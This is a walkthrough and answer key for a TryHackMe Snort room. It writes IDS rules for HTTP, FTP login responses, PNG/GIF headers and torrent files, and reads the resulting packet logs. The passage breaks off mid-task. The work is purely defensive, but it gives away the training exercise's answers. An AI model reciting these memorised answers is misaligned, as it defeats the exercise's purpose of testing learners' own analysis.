# Snort Challenge - The Basics

- [Room information](#room-information)
- [Solution](#solution)
- [References](#references)

## Room information

```text
Type: Walkthrough
Difficulty: Medium
OS: N/A
Subscription type: Premium
Description: Put your snort skills into practice and write snort rules to analyse live capture network traffic.
```

Room link: [https://tryhackme.com/room/snortchallenges1](https://tryhackme.com/room/snortchallenges1)

## Solution

### Task 1 - Introduction

The room invites you a challenge to investigate a series of traffic data and stop malicious activity under two different scenarios. Let's start working with Snort to analyse live and captured traffic.

We recommend completing the [Snort room](https://tryhackme.com/room/snort) first, which will teach you how to use the tool in depth.

Exercise files for each task are located on the desktop in the directory `/home/ubuntu/Desktop/Exercise-Files`

### Task 2 - Writing IDS Rules (HTTP)

Let's create IDS Rules for HTTP traffic!

Navigate to the task folder and use the given pcap file. Write a rule to detect all TCP packets **from or to** port 80.

#### What is the number of detected packets you got?

Note: You must answer this question correctly before answering the rest of the questions.

Hint: You need to investigate inbound and outbound traffic on port 80. Make sure to only use a single rule, or you potentially get wrong results for the next questions.

```bash
ubuntu@ip-10-10-135-195:~/Desktop/Exercise-Files/TASK-2 (HTTP)$ cat local.rules 
# ----------------
# LOCAL RULES
# ----------------
# This file intentionally does not come with signatures.  Put your local
# additions here.
alert tcp any any <> any 80 (msg: "TCP Port 80 Activity"; sid: 200001; rev:1;)

ubuntu@ip-10-10-135-195:~/Desktop/Exercise-Files/TASK-2 (HTTP)$ sudo snort -q -c local.rules -A console -l . -r mx-3.pcap | wc -l
164
```

Answer: 164

#### Investigate the log file. What is the destination address of packet 63?

Hint: `-n` parameter helps analyze the "n" number of packets.

```bash
ubuntu@ip-10-10-135-195:~/Desktop/Exercise-Files/TASK-2 (HTTP)$ sudo snort -c local.rules -A full -l . -r mx-3.pcap
Running in IDS mode

        --== Initializing Snort ==--
Initializing Output Plugins!
Initializing Preprocessors!
Initializing Plug-ins!
Parsing Rules file "local.rules"
Tagged Packet Limit: 256
Log directory = .
<---snip--->
ubuntu@ip-10-10-135-195:~/Desktop/Exercise-Files/TASK-2 (HTTP)$ sudo snort -r snort.log.1746780468 -n 63
Exiting after 63 packets
Running in packet dump mode

        --== Initializing Snort ==--
Initializing Output Plugins!
pcap DAQ configured to read-file.
Acquiring network traffic from "snort.log.1746780468".

        --== Initialization Complete ==--
<---snip--->
=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+

WARNING: No preprocessors configured for policy 0.
05/13-10:17:10.295515 145.254.160.237:3371 -> 216.239.59.99:80
TCP TTL:128 TOS:0x0 ID:3917 IpLen:20 DgmLen:761 DF
***AP*** Seq: 0x36C21E28  Ack: 0x2E6B5384  Win: 0x2238  TcpLen: 20
=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+

===============================================================================
Run time for packet processing was 0.1547 seconds
Snort processed 63 packets.
Snort ran for 0 days 0 hours 0 minutes 0 seconds
   Pkts/sec:           63
<---snip--->
```

Answer: 216.239.59.99

#### Investigate the log file. What is the ACK number of packet 64?

```bash
ubuntu@ip-10-10-135-195:~/Desktop/Exercise-Files/TASK-2 (HTTP)$ sudo snort -r snort.log.1746780468 -n 64
Exiting after 64 packets
Running in packet dump mode

        --== Initializing Snort ==--
Initializing Output Plugins!
pcap DAQ configured to read-file.
Acquiring network traffic from "snort.log.1746780468".

        --== Initialization Complete ==--
<---snip--->
=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+

WARNING: No preprocessors configured for policy 0.
05/13-10:17:10.295515 145.254.160.237:3371 -> 216.239.59.99:80
TCP TTL:128 TOS:0x0 ID:3917 IpLen:20 DgmLen:761 DF
***AP*** Seq: 0x36C21E28  Ack: 0x2E6B5384  Win: 0x2238  TcpLen: 20
=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+

===============================================================================
Run time for packet processing was 0.1531 seconds
Snort processed 64 packets.
Snort ran for 0 days 0 hours 0 minutes 0 seconds
   Pkts/sec:           64
<---snip--->
```

Answer: 0x2E6B5384

#### Investigate the log file. What is the SEQ number of packet 62?

```bash
ubuntu@ip-10-10-135-195:~/Desktop/Exercise-Files/TASK-2 (HTTP)$ sudo snort -r snort.log.1746780468 -n 62
Exiting after 62 packets
Running in packet dump mode

        --== Initializing Snort ==--
Initializing Output Plugins!
pcap DAQ configured to read-file.
Acquiring network traffic from "snort.log.1746780468".

        --== Initialization Complete ==--
<---snip--->
=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+

WARNING: No preprocessors configured for policy 0.
05/13-10:17:10.295515 145.254.160.237:3371 -> 216.239.59.99:80
TCP TTL:128 TOS:0x0 ID:3917 IpLen:20 DgmLen:761 DF
***AP*** Seq: 0x36C21E28  Ack: 0x2E6B5384  Win: 0x2238  TcpLen: 20
=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+

===============================================================================
Run time for packet processing was 0.1455 seconds
Snort processed 62 packets.
Snort ran for 0 days 0 hours 0 minutes 0 seconds
   Pkts/sec:           62
<---snip--->
```

Answer: 0x36C21E28

#### Investigate the log file. What is the TTL of packet 65?

```bash
ubuntu@ip-10-10-135-195:~/Desktop/Exercise-Files/TASK-2 (HTTP)$ sudo snort -r snort.log.1746780468 -n 65
Exiting after 65 packets
Running in packet dump mode

        --== Initializing Snort ==--
Initializing Output Plugins!
pcap DAQ configured to read-file.
Acquiring network traffic from "snort.log.1746780468".

        --== Initialization Complete ==--
<---snip--->
=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+

WARNING: No preprocessors configured for policy 0.
05/13-10:17:10.325558 145.254.160.237:3372 -> 65.208.228.223:80
TCP TTL:128 TOS:0x0 ID:3918 IpLen:20 DgmLen:40 DF
***A**** Seq: 0x38AFFFF3  Ack: 0x114C81E4  Win: 0x25BC  TcpLen: 20
=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+

===============================================================================
Run time for packet processing was 0.1651 seconds
Snort processed 65 packets.
Snort ran for 0 days 0 hours 0 minutes 0 seconds
   Pkts/sec:           65
<---snip--->
```

Answer: 128

#### Investigate the log file. What is the source IP of packet 65?

```bash
ubuntu@ip-10-10-135-195:~/Desktop/Exercise-Files/TASK-2 (HTTP)$ sudo snort -r snort.log.1746780468 -n 65
Exiting after 65 packets
Running in packet dump mode

        --== Initializing Snort ==--
Initializing Output Plugins!
pcap DAQ configured to read-file.
Acquiring network traffic from "snort.log.1746780468".

        --== Initialization Complete ==--
<---snip--->
=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+

WARNING: No preprocessors configured for policy 0.
05/13-10:17:10.325558 145.254.160.237:3372 -> 65.208.228.223:80
TCP TTL:128 TOS:0x0 ID:3918 IpLen:20 DgmLen:40 DF
***A**** Seq: 0x38AFFFF3  Ack: 0x114C81E4  Win: 0x25BC  TcpLen: 20
=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+

===============================================================================
Run time for packet processing was 0.1651 seconds
Snort processed 65 packets.
Snort ran for 0 days 0 hours 0 minutes 0 seconds
   Pkts/sec:           65
<---snip--->
```

Answer: 145.254.160.237

#### Investigate the log file. What is the source port of packet 65?

```bash
ubuntu@ip-10-10-135-195:~/Desktop/Exercise-Files/TASK-2 (HTTP)$ sudo snort -r snort.log.1746780468 -n 65
Exiting after 65 packets
Running in packet dump mode

        --== Initializing Snort ==--
Initializing Output Plugins!
pcap DAQ configured to read-file.
Acquiring network traffic from "snort.log.1746780468".

        --== Initialization Complete ==--
<---snip--->
=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+

WARNING: No preprocessors configured for policy 0.
05/13-10:17:10.325558 145.254.160.237:3372 -> 65.208.228.223:80
TCP TTL:128 TOS:0x0 ID:3918 IpLen:20 DgmLen:40 DF
***A**** Seq: 0x38AFFFF3  Ack: 0x114C81E4  Win: 0x25BC  TcpLen: 20
=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+

===============================================================================
Run time for packet processing was 0.1651 seconds
Snort processed 65 packets.
Snort ran for 0 days 0 hours 0 minutes 0 seconds
   Pkts/sec:           65
<---snip--->
```

Answer: 3372

### Task 3 - Writing IDS Rules (FTP)

Let's create IDS Rules for FTP traffic!

Navigate to the task folder. Use the given pcap file.

Write a single rule to detect "all TCP port 21"  traffic in the given pcap.

#### What is the number of detected packets?

Hint: You need to investigate inbound and outbound traffic on port 21.

```bash
ubuntu@ip-10-10-135-195:~/Desktop/Exercise-Files/TASK-3 (FTP)$ cat local.rules 
# ----------------
# LOCAL RULES
# ----------------
# This file intentionally does not come with signatures.  Put your local
# additions here.
alert tcp any any <> any 21 (msg: "TCP Port 21 Activity"; sid: 200002; rev:1;)

ubuntu@ip-10-10-135-195:~/Desktop/Exercise-Files/TASK-3 (FTP)$ sudo snort -c local.rules -A full -l . -r ftp-png-gif.pcap 
Running in IDS mode

        --== Initializing Snort ==--
Initializing Output Plugins!
Initializing Preprocessors!
Initializing Plug-ins!
Parsing Rules file "local.rules"
Tagged Packet Limit: 256
Log directory = .
<---snip--->
===============================================================================
Action Stats:
     Alerts:          307 ( 72.922%)
     Logged:          307 ( 72.922%)
     Passed:            0 (  0.000%)
<---snip--->
```

Answer: 307

#### Investigate the log file. What is the FTP service name?

```bash
ubuntu@ip-10-10-135-195:~/Desktop/Exercise-Files/TASK-3 (FTP)$ sudo snort -r snort.log.1746781572 -X -n 10
Exiting after 10 packets
Running in packet dump mode

        --== Initializing Snort ==--
Initializing Output Plugins!
pcap DAQ configured to read-file.
Acquiring network traffic from "snort.log.1746781572".

        --== Initialization Complete ==--
<---snip--->
=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+

WARNING: No preprocessors configured for policy 0.
01/04-10:19:34.008856 192.168.75.132:21 -> 192.168.75.1:18157
TCP TTL:128 TOS:0x0 ID:1696 IpLen:20 DgmLen:79 DF
***AP*** Seq: 0x93FDAA43  Ack: 0xE9CEC219  Win: 0xFAF0  TcpLen: 32
TCP Options (3) => NOP NOP TS: 13955 7457661 
0x0000: 00 50 56 C0 00 08 00 0C 29 0F 71 A3 08 00 45 00  .PV.....).q...E.
0x0010: 00 4F 06 A0 40 00 80 06 DC 32 C0 A8 4B 84 C0 A8  .O..@....2..K...
0x0020: 4B 01 00 15 46 ED 93 FD AA 43 E9 CE C2 19 80 18  K...F....C......
0x0030: FA F0 95 4B 00 00 01 01 08 0A 00 00 36 83 00 71  ...K........6..q
0x0040: CB 7D 32 32 30 20 4D 69 63 72 6F 73 6F 66 74 20  .}220 Microsoft 
0x0050: 46 54 50 20 53 65 72 76 69 63 65 0D 0A           FTP Service..

=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+
<---snip--->
```

Answer: Microsoft FTP Service

Clear the previous log and alarm files. Deactivate/comment on the old rules.

Write a rule to detect failed FTP login attempts in the given pcap.

Consulting the [list of FTP server return codes](https://en.wikipedia.org/wiki/List_of_FTP_server_return_codes) the status code of `530` (Not logged in.) seems a likely candidate for failed logins.

We verify this with the snort log file

```bash
ubuntu@ip-10-10-135-195:~/Desktop/Exercise-Files/TASK-3 (FTP)$ sudo snort -r snort.log.1746781941 -X 2> /dev/null | grep 530 -A1 
0x0040: CB 91 35 33 30 20 55 73 65 72 20 74 65 73 74 20  ..530 User test 
0x0050: 63 61 6E 6E 6F 74 20 6C 6F 67 20 69 6E 2E 0D 0A  cannot log in...
-
0x0040: CB 91 35 33 30 20 55 73 65 72 20 74 65 73 74 20  ..530 User test 
0x0050: 63 61 6E 6E 6F 74 20 6C 6F 67 20 69 6E 2E 0D 0A  cannot log in...
-
0x0040: CB 91 35 33 30 20 55 73 65 72 20 61 64 6D 69 6E  ..530 User admin
0x0050: 20 63 61 6E 6E 6F 74 20 6C 6F 67 20 69 6E 2E 0D   cannot log in..
-
0x0040: CB 91 35 33 30 20 55 73 65 72 20 61 64 6D 69 6E  ..530 User admin
0x0050: 20 63 61 6E 6E 6F 74 20 6C 6F 67 20 69 6E 2E 0D   cannot log in..
<---snip--->
```

The status message is of the form `User <user> cannot log in`.

Next, we create our rule

```bash
ubuntu@ip-10-10-135-195:~/Desktop/Exercise-Files/TASK-3 (FTP)$ cat local.rules 
# ----------------
# LOCAL RULES
# ----------------
# This file intentionally does not come with signatures.  Put your local
# additions here.
alert tcp any 21 <> any any (msg: "FTP Failed login"; content:"530 User "; sid: 200003; rev:1;)

```

#### What is the number of detected packets?

Hint: Each failed FTP login attempt prompts a default message with the pattern; "530 User". Try to filter the given pattern in the inbound FTP traffic.

```bash
ubuntu@ip-10-10-135-195:~/Desktop/Exercise-Files/TASK-3 (FTP)$ sudo snort -c local.rules -A full -l . -r ftp-png-gif.pcap 
Running in IDS mode

        --== Initializing Snort ==--
Initializing Output Plugins!
Initializing Preprocessors!
Initializing Plug-ins!
Parsing Rules file "local.rules"
Tagged Packet Limit: 256
Log directory = .
<---snip--->
===============================================================================
Action Stats:
     Alerts:           41 (  9.739%)
     Logged:           41 (  9.739%)
     Passed:            0 (  0.000%)
<---snip--->
```

Answer: 41

Clear the previous log and alarm files. Deactivate/comment on the old rule.

Write a rule to detect successful FTP logins in the given pcap.

The status code for successful logins is probably `230` (User logged in, proceed.).

As before we doublecheck the status message, this time with `tcpdump`

```bash
ubuntu@ip-10-10-135-195:~/Desktop/Exercise-Files/TASK-3 (FTP)$ tcpdump -r ftp-png-gif.pcap | grep 230 -A1
reading from file ftp-png-gif.pcap, link-type EN10MB (Ethernet)
10:19:34.205230 IP ip-192-168-75-1.eu-west-1.compute.internal.18158 > ip-192-168-75-132.eu-west-1.compute.internal.ftp: Flags [P.], seq 13:24, ack 62, win 16636, options [nop,nop,TS val 7457681 ecr 13957], length 11: FTP: PASS anon
10:19:34.214659 IP ip-192-168-75-1.eu-west-1.compute.internal.18165 > ip-192-168-75-132.eu-west-1.compute.internal.ftp: Flags [P.], seq 1:13, ack 28, win 16645, options [nop,nop,TS val 7457682 ecr 13956], length 12: FTP: USER admin
-
10:19:34.546056 IP ip-192-168-75-132.eu-west-1.compute.internal.ftp > ip-192-168-75-1.eu-west-1.compute.internal.18164: Flags [P.], seq 198:233, ack 84, win 64157, options [nop,nop,TS val 13961 ecr 7457703], length 35: FTP: 230 User Administrator logged in.
10:19:34.548900 IP ip-192-168-75-1.eu-west-1.compute.internal.18164 > ip-192-168-75-132.eu-west-1.compute.internal.ftp: Flags [F.], seq 84, ack 233, win 16594, options [nop,nop,TS val 7457715 ecr 13961], length 0
<---snip--->
```

The status message is of the form `User <user> logged in`.

Our rule becomes

```bash
ubuntu@ip-10-10-135-195:~/Desktop/Exercise-Files/TASK-3 (FTP)$ cat local.rules 
# ----------------
# LOCAL RULES
# ----------------
# This file intentionally does not come with signatures.  Put your local
# additions here.
alert tcp any 21 <> any any (msg: "FTP Successful login"; content:"230 User "; sid: 200004; rev:1;)
```

#### What is the number of detected packets?

Hint: Each successful FTP login attempt prompts a default message with the pattern; "230 User". Try to filter the given pattern in the FTP traffic.

```bash
ubuntu@ip-10-10-135-195:~/Desktop/Exercise-Files/TASK-3 (FTP)$ sudo snort -c local.rules -A full -l . -r ftp-png-gif.pcap 
Running in IDS mode

        --== Initializing Snort ==--
Initializing Output Plugins!
Initializing Preprocessors!
Initializing Plug-ins!
Parsing Rules file "local.rules"
Tagged Packet Limit: 256
Log directory = .
<---snip--->
===============================================================================
Action Stats:
     Alerts:            1 (  0.238%)
     Logged:            1 (  0.238%)
     Passed:            0 (  0.000%)
<---snip--->
```

Answer: 1

Clear the previous log and alarm files. Deactivate/comment on the old rule.

Write a rule to detect FTP login attempts with a valid username but no password entered yet.

#### What is the number of detected packets?

Hint: Each FTP login attempt with a valid username prompts a default message with the pattern; "331 Password". Try to filter the given pattern in the FTP traffic.

```bash
ubuntu@ip-10-10-135-195:~/Desktop/Exercise-Files/TASK-3 (FTP)$ cat local.rules 
# ----------------
# LOCAL RULES
# ----------------
# This file intentionally does not come with signatures.  Put your local
# additions here.
alert tcp any 21 <> any any (msg: "FTP Password required"; content:"331 Password required"; sid: 200005; rev:1;)

ubuntu@ip-10-10-135-195:~/Desktop/Exercise-Files/TASK-3 (FTP)$ sudo snort -c local.rules -A full -l . -r ftp-png-gif.pcap 
Running in IDS mode

        --== Initializing Snort ==--
Initializing Output Plugins!
Initializing Preprocessors!
Initializing Plug-ins!
Parsing Rules file "local.rules"
Tagged Packet Limit: 256
Log directory = .
<---snip--->
===============================================================================
Action Stats:
     Alerts:           42 (  9.976%)
     Logged:           42 (  9.976%)
     Passed:            0 (  0.000%)
<---snip--->
```

Answer: 42

Clear the previous log and alarm files. Deactivate/comment on the old rule.

Write a rule to detect FTP login attempts with the "Administrator" username but no password entered yet.

#### What is the number of detected packets?

Hint: You can use the "content" filter more than one time.

```bash
ubuntu@ip-10-10-135-195:~/Desktop/Exercise-Files/TASK-3 (FTP)$ cat local.rules 
# ----------------
# LOCAL RULES
# ----------------
# This file intentionally does not come with signatures.  Put your local
# additions here.
alert tcp any 21 <> any any (msg: "FTP Password required for Admin"; content:"331 Password required for Administrator"; sid: 200006; rev:1;)

ubuntu@ip-10-10-135-195:~/Desktop/Exercise-Files/TASK-3 (FTP)$ sudo snort -c local.rules -A full -l . -r ftp-png-gif.pcap 
Running in IDS mode

        --== Initializing Snort ==--
Initializing Output Plugins!
<---snip--->
===============================================================================
Action Stats:
     Alerts:            7 (  1.663%)
     Logged:            7 (  1.663%)
     Passed:            0 (  0.000%)
<---snip--->
```

Answer: 7

### Task 4 - Writing IDS Rules (PNG)

Let's create IDS Rules for PNG files in the traffic!

Navigate to the task folder. Use the given pcap file.

Write a rule to detect the PNG file in the given pcap.

First we consult the [list of file signatures](https://en.wikipedia.org/wiki/List_of_file_signatures) to see how we can detect PNG images.

The magic header bytes for PNG seems to be: `89 50 4E 47 0D 0A 1A 0A`.

Our rule becomes

```bash
ubuntu@ip-10-10-135-195:~/Desktop/Exercise-Files/TASK-4 (PNG)$ cat local.rules 
# ----------------
# LOCAL RULES
# ----------------
# This file intentionally does not come with signatures.  Put your local
# additions here.

alert tcp any any <> any any (msg: "PNG File Header"; content:"|89 50 4E 47 0D 0A 1A 0A|"; sid: 200007; rev:1;)

```

Run snort to create a log file

```bash
ubuntu@ip-10-10-135-195:~/Desktop/Exercise-Files/TASK-4 (PNG)$ sudo snort -c local.rules -A full -l . -r ftp-png-gif.pcap 
Running in IDS mode

        --== Initializing Snort ==--
Initializing Output Plugins!
Initializing Preprocessors!
Initializing Plug-ins!
Parsing Rules file "local.rules"
Tagged Packet Limit: 256
Log directory = .
<---snip--->
===============================================================================
Action Stats:
     Alerts:            1 (  0.238%)
     Logged:            1 (  0.238%)
     Passed:            0 (  0.000%)
<---snip--->
```

#### Investigate the logs and identify the software name embedded in the packet

```bash
ubuntu@ip-10-10-135-195:~/Desktop/Exercise-Files/TASK-4 (PNG)$ sudo snort -X -r snort.log.1746785647 
Running in packet dump mode

        --== Initializing Snort ==--
Initializing Output Plugins!
pcap DAQ configured to read-file.
Acquiring network traffic from "snort.log.1746785647".
<---snip--->
01/05-20:15:59.817928 176.255.203.40:80 -> 192.168.47.171:2732
TCP TTL:128 TOS:0x0 ID:63105 IpLen:20 DgmLen:1174
***AP*** Seq: 0x3D2348B0  Ack: 0x8C8DF67F  Win: 0xFAF0  TcpLen: 20
0x0000: 00 0C 29 1D B3 B1 00 50 56 FD 2F 16 08 00 45 00  ..)....PV./...E.
0x0010: 04 96 F6 81 00 00 80 06 D3 64 B0 FF CB 28 C0 A8  .........d...(..
0x0020: 2F AB 00 50 0A AC 3D 23 48 B0 8C 8D F6 7F 50 18  /..P..=#H.....P.
0x0030: FA F0 F9 DD 00 00 89 50 4E 47 0D 0A 1A 0A 00 00  .......PNG......
0x0040: 00 0D 49 48 44 52 00 00 01 E0 00 00 01 E0 08 06  ..IHDR..........
0x0050: 00 00 00 7D D4 BE 95 00 00 00 19 74 45 58 74 53  ...}.......tEXtS
0x0060: 6F 66 74 77 61 72 65 00 41 64 6F 62 65 20 49 6D  oftware.Adobe Im
0x0070: 61 67 65 52 65 61 64 79 71 C9 65 3C 00 00 16 2E  ageReadyq.e<....
0x0080: 49 44 41 54 78 DA EC DD 7F 88 65 57 61 07 F0 97  IDATx.....eWa...
<---snip--->
```

Answer: Adobe ImageReady

Clear the previous log and alarm files. Deactivate/comment on the old rule.

Write a rule to detect the GIF file in the given pcap.

GIF images can have two different magic headers dependent on the type:

- **GIF87a**: `47 49 46 38 37 61`
- **GIF89a**: `47 49 46 38 39 61`

So let's write two rules. Our rules becomes

```bash
ubuntu@ip-10-10-135-195:~/Desktop/Exercise-Files/TASK-4 (PNG)$ cat local.rules 
# ----------------
# LOCAL RULES
# ----------------
# This file intentionally does not come with signatures.  Put your local
# additions here.

alert tcp any any <> any any (msg: "GIF87a File Header"; content:"|47 49 46 38 37 61|"; sid: 200008; rev:1;)
alert tcp any any <> any any (msg: "GIF89a File Header"; content:"|47 49 46 38 39 61|"; sid: 200009; rev:1;)
```

Run snort to create a log file

```bash
ubuntu@ip-10-10-135-195:~/Desktop/Exercise-Files/TASK-4 (PNG)$ sudo rm alert snort.log.1746785647 
ubuntu@ip-10-10-135-195:~/Desktop/Exercise-Files/TASK-4 (PNG)$ sudo snort -c local.rules -A full -l . -r ftp-png-gif.pcap 
Running in IDS mode

        --== Initializing Snort ==--
Initializing Output Plugins!
Initializing Preprocessors!
Initializing Plug-ins!
Parsing Rules file "local.rules"
Tagged Packet Limit: 256
Log directory = .
<---snip--->
===============================================================================
Action Stats:
     Alerts:            4 (  0.950%)
     Logged:            4 (  0.950%)
     Passed:            0 (  0.000%)
<---snip--->
```

#### Investigate the logs and identify the image format embedded in the packet

Hint: Check for the MIME type/Magic Number.

```bash
ubuntu@ip-10-10-135-195:~/Desktop/Exercise-Files/TASK-4 (PNG)$ cat alert 
[**] [1:200009:1] GIF89a File Header [**]
[Priority: 0] 
01/05-20:15:46.525001 77.72.118.168:80 -> 192.168.47.171:2738
TCP TTL:128 TOS:0x0 ID:63078 IpLen:20 DgmLen:83
***AP**F Seq: 0x11976E7A  Ack: 0xC8BE2DE7  Win: 0xFAF0  TcpLen: 20

[**] [1:200009:1] GIF89a File Header [**]
[Priority: 0] 
01/05-20:15:46.682236 77.72.118.168:80 -> 192.168.47.171:2739
TCP TTL:128 TOS:0x0 ID:63085 IpLen:20 DgmLen:83
***AP**F Seq: 0x32A2AF7  Ack: 0xC4B5FD53  Win: 0xFAF0  TcpLen: 20

[**] [1:200009:1] GIF89a File Header [**]
[Priority: 0] 
01/05-20:15:46.691761 77.72.118.168:80 -> 192.168.47.171:2740
TCP TTL:128 TOS:0x0 ID:63089 IpLen:20 DgmLen:83
***AP**F Seq: 0x142B362E  Ack: 0xD36AF6ED  Win: 0xFAF0  TcpLen: 20

[**] [1:200009:1] GIF89a File Header [**]
[Priority: 0] 
01/05-20:15:46.771530 77.72.118.168:80 -> 192.168.47.171:2741
TCP TTL:128 TOS:0x0 ID:63093 IpLen:20 DgmLen:83
***AP**F Seq: 0x2FC56F3  Ack: 0xA6C502A7  Win: 0xFAF0  TcpLen: 20
```

Answer: GIF89a

### Task 5 - Writing IDS Rules (Torrent Metafile)

Let's create IDS Rules for torrent metafiles in the traffic!

Research the [Torrent file](https://en.wikipedia.org/wiki/Torrent_file) format but there doesn't seem to be any magic bytes headers.  
Instead, a torrent file "just" contains metadata about the files and folders to be distributed.

The hint suggests though: Torrent metafiles have a common name extension (.torrent). Try to filter the given pattern in the TCP traffic.

Our rule becomes

```bash
ubuntu@ip-10-10-135-195:~/Desktop/Exercise-Files/TASK-5 (TorrentMetafile)$ cat local.rules 

# ----------------
# LOCAL RULES
# ----------------
# This file intentionally does not come with signatures.  Put your local
# additions here.
alert tcp any any <> any any (msg: "Torrent File Extension"; content:".torrent"; sid: 200010; rev:1;)

```

#### What is the number of detected packets?

Hint: Torrent metafiles have a common name extension (.torrent). Try to filter the given pattern in the TCP traffic.

```bash
ubuntu@ip-10-10-135-195:~/Desktop/Exercise-Files/TASK-5 (TorrentMetafile)$ sudo snort -c local.rules -A full -l . -r torrent.pcap 
Running in IDS mode

        --== Initializing Snort ==--
Initializing Output Plugins!
Initializing Preprocessors!
Initializing Plug-ins!
Parsing Rules file "local.rules"
Tagged Packet Limit: 256
Log directory = .
<---snip--->
===============================================================================
Action Stats:
     Alerts:            2 (  3.571%)
     Logged:            2 (  3.571%)
     Passed:            0 (  0.000%)
<---snip--->
```

Answer: 2

#### Investigate the log/alarm files. What is the name of the torrent application?

```bash
ubuntu@ip-10-10-135-195:~/Desktop/Exercise-Files/TASK-5 (TorrentMetafile)$ sudo snort -X -r snort.log.1746788021 
Running in packet dump mode

        --== Initializing Snort ==--
Initializing Output Plugins!
pcap DAQ configured to read-file.
Acquiring network traffic from "snort.log.1746788021".
<---snip--->
=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+

WARNING: No preprocessors configured for policy 0.
07/03-07:54:42.551000 213.122.214.127:3904 -> 69.44.153.178:2710
TCP TTL:128 TOS:0x0 ID:22748 IpLen:20 DgmLen:390 DF
***AP*** Seq: 0xEA47AA16  Ack: 0xEE93DF8E  Win: 0x2238  TcpLen: 20
0x0000: BC DF 20 00 01 00 00 00 01 00 00 00 08 00 45 00  .. ...........E.
0x0010: 01 86 58 DC 40 00 80 06 15 BD D5 7A D6 7F 45 2C  ..X.@......z..E,
0x0020: 99 B2 0F 40 0A 96 EA 47 AA 16 EE 93 DF 8E 50 18  ...@...G......P.
0x0030: 22 38 18 91 00 00 47 45 54 20 2F 61 6E 6E 6F 75  "8....GET /annou
0x0040: 6E 63 65 3F 69 6E 66 6F 5F 68 61 73 68 3D 25 30  nce?info_hash=%0
0x0050: 31 64 25 46 45 25 37 45 25 46 31 25 31 30 25 35  1d%FE%7E%F1%10%5
0x0060: 43 57 76 41 70 25 45 44 25 46 36 25 30 33 25 43  CWvAp%ED%F6%03%C
0x0070: 34 39 25 44 36 42 25 31 34 25 46 31 26 70 65 65  49%D6B%14%F1&pee
0x0080: 72 5F 69 64 3D 25 42 38 6A 73 25 37 46 25 45 38  r_id=%B8js%7F%E8
0x0090: 25 30 43 25 41 46 68 25 30 32 59 25 39 36 37 25  %0C%AFh%02Y%967%
0x00A0: 32 34 65 25 32 37 56 25 45 45 4D 25 31 36 25 35  24e%27V%EEM%16%5
0x00B0: 42 26 70 6F 72 74 3D 34 31 37 33 30 26 75 70 6C  B&port=41730&upl
0x00C0: 6F 61 64 65 64 3D 30 26 64 6F 77 6E 6C 6F 61 64  oaded=0&download
0x00D0: 65 64 3D 30 26 6C 65 66 74 3D 33 37 36 37 38 36  ed=0&left=376786
0x00E0: 39 26 63 6F 6D 70 61 63 74 3D 31 26 69 70 3D 31  9&compact=1&ip=1
0x00F0: 32 37 2E 30 2E 30 2E 31 20 48 54 54 50 2F 31 2E  27.0.0.1 HTTP/1.
0x0100: 31 0D 0A 41 63 63 65 70 74 3A 20 61 70 70 6C 69  1..Accept: appli
0x0110: 63 61 74 69 6F 6E 2F 78 2D 62 69 74 74 6F 72 72  cation/x-bittorr
0x0120: 65 6E 74 0D 0A 41 63 63 65 70 74 2D 45 6E 63 6F  ent..Accept-Enco
0x0130: 64 69 6E 67 3A 20 67 7A 69 70 0D 0A 55 73 65 72  ding: gzip..User
0x0140: 2D 41 67 65 6E 74 3A 20 52 41 5A 41 20 32 2E 31  -Agent: RAZA 2.1
0x0150: 2E 30 2E 30 0D 0A 48 6F 73 74 3A 20 74 72 61 63  .0.0..Host: trac
0x0160: 6B 65 72 32 2E 74 6F 72 72 65 6E 74 62 6F 78 2E  ker2.torrentbox.
0x0170: 63 6F 6D 3A 32 37 31 30 0D 0A 43 6F 6E 6E 65 63  com:2710..Connec
0x0180: 74 69 6F 6E 3A 20 4B 65 65 70 2D 41 6C 69 76 65  tion: Keep-Alive
0x0190: 0D 0A 0D 0A                                      ....

=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+
<---snip--->
```

I really didn't get this question's answer and solved it with a lot of trial-and-error!?

Answer: bittorrent

#### What is the MIME (Multipurpose Internet Mail Extensions) type of the torrent metafile?

```bash
ubuntu@ip-10-10-135-195:~/Desktop/Exercise-Files/TASK-5 (TorrentMetafile)$ sudo snort -X -r snort.log.1746788021 
Running in packet dump mode

        --== Initializing Snort ==--
Initializing Output Plugins!
pcap DAQ configured to read-file.
Acquiring network traffic from "snort.log.1746788021".
<---snip--->
